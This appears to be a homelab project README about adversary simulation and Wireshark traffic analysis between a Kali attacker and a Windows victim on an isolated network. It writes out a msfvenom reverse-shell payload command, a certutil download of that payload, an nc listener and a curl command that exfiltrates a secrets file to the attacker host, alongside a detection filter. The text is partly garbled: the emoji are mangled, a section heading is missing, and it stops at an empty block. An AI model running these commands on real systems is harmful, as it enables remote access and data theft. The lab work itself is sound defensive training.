# üîç Network Analysis Project

## üìå Overview
This project demonstrates **end-to-end adversary simulation and network traffic analysis** in a controlled homelab environment.  
By generating malicious traffic myself (instead of using pre-made PCAPs), I captured it in real-time and analyzed it in Wireshark to showcase how a SOC analyst detects and responds to real-world threats. This hands-on approach highlights practical skills in red teaming, packet capture, forensic analysis, and threat mapping.

I acted as both:
- **Red Team (Attacker):** Simulating MITRE ATT&CK techniques such as command-and-control (C2), data exfiltration, credential access, and lateral movement.
- **Blue Team (Defender):** Capturing PCAPs, analyzing traffic in Wireshark, and developing detection rules mapped to MITRE ATT&CK.

---

## üñ•Ô∏è Lab Setup
- **Attacker:** Kali Linux (`192.168.2.131`)
- **Victim:** Windows 10 FLARE VM (`192.168.2.129`)
- **Sniffer:** Wireshark (running on Windows for packet capture). For this lab, I applied custom filters along with Basic, Basic+, and Basic+DNS profiles to reduce noise and highlight relevant traffic. This allowed me to focus on HTTP requests, TLS handshakes, and DNS queries, while filtering out unnecessary broadcast traffic.
- **Network:** VirtualBox Host-Only Network (isolated for safety).
- **Tools Used:** msfvenom, netcat (nc), certutil, ftp, custom scripts for beaconing; Wireshark for analysis; Sysmon for endpoint correlation (where applicable).

---

## üéØ Objectives
- Generate **realistic malicious traffic** across the attack lifecycle (initial access, execution, persistence, exfiltration).
- Capture all traffic in **PCAP format** for forensic replay.
- Perform **deep packet inspection** with Wireshark filters and stream reconstruction.
- Map detections to the **MITRE ATT&CK framework** for threat intelligence alignment.
- Identify IOCs and recommend defenses to enhance SOC workflows.

## ‚öîÔ∏è Red Team vs Blue Team Scenarios

### ‚úÖ Scenario 1 ‚Äî Reverse Shell (C2 over TCP)
- **Red Team Action:**  
  - Generated a reverse shell payload with `msfvenom`:
    ```bash
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.131 LPORT=4444 -f exe -o payload.exe

Hosted the payload on Kali and delivered it via certutil on the victim:
cmdcertutil -urlcache -split -f http://192.168.2.131:8080/payload.exe payload.exe
Executed the payload on the victim to establish a reverse shell back to the attacker (using nc -lvnp 4444 on Kali).

### Blue Team Detection (Wireshark):
Filter:
 ```wireshark
(http.request or tls.handshake.type==1) and !(ssdp)
 ```

 ```cmd
cmdcurl -X POST -F "file=@secrets.txt" http://192.168.2.131:8080/exfil
 ```
Attacker received the file on Kali using a simple Python HTTP server with POST handling.

Blue Team Detection (Wireshark):

Filter:
 ```wireshark
